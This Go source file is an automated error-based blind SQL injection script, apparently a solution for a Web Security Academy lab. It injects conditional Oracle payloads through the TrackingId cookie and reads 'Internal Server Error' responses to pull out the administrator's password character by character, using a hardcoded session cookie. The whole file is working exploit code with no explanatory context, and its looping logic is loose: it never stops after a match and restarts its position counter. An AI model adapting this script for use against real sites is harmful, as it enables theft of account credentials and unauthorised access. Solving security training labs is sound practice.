package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

func main() {
	url := "https://ac351ff81fcced5880c19f7c0074003a.web-security-academy.net"
	chars := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-/%$#@()*+!=^"
	i := 1
	password := ""
	for {
		for _, char := range chars {
			payload := fmt.Sprintf(
				`iCr' and (select case when substr(password, %d, 1) = '%s'`,
				i, string(char),
			)
			payload += " then to_char(1/0) else 'a' end from users where username = 'administrator')='a"
			// fmt.Println(payload)
			client := &http.Client{}
			req, _ := http.NewRequest("GET", url, nil)
			req.Header.Set("Cookie", fmt.Sprintf("TrackingId=%s; session=xEtjp5MWNBA0Jx2Aqrm7NdOrQJoiM3wD", payload))
			res, err := client.Do(req)
			if err != nil {
				fmt.Println("Error:", err)
				os.Exit(1)
			}
			defer res.Body.Close()
			body, _ := ioutil.ReadAll(res.Body)
			if strings.Contains(string(body), "Internal Server Error") {
				password += string(char)
				fmt.Println(password)
			} else {
				continue
			}
			// fmt.Println(string(body))
			// fmt.Println(payload)
			// time.Sleep(time.Second)
		}
		i++
		if i > 64 {
			i = 0
		}
	}
}
